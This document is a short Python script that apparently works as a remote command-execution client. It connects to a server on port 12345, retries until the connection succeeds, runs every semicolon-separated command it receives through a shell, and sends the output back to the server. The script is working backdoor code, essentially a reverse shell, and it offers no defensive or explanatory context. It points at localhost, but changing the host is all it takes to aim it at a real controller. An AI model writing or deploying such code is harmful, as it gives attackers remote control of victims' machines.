import socket
import json
import os
import subprocess
import threading
import time

def connect_to_server():
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    host = '127.0.0.1'
    port = 12345

    while True:
        try:
            client_socket.connect((host, port))
            print("Connected to the server.")
            return client_socket
        except Exception as e:
            print("Connection failed. Retrying in 10 seconds...")
            time.sleep(10)

def execute_command(command, client_socket):
    try:
        output = b""
        for cmd in command.split(";"):
            output += subprocess.check_output(cmd, shell=True)
        output = str(output, encoding="850")
    except subprocess.CalledProcessError as e:
        output = "Error: " + str(e)
        print("Error:", e)
    except Exception as e:
        output = "Error: " + str(e)
        print("Error:", e)

    client_socket.sendall(json.dumps({"message": output}).encode())

def main():
    client_socket = connect_to_server()

    while True:
        try:
            response = client_socket.recv(1024).decode()
            if not response:
                break
            response = json.loads(response)
            print("Server's response:", response)
            threads = []
            for command in response["message"].split(";"):
                thread = threading.Thread(target=execute_command, args=(command, client_socket))
                thread.start()
                threads.append(thread)
                    

        except Exception as e:
            print("Error:", e)
            break

    client_socket.close()

if __name__ == "__main__":
    main()
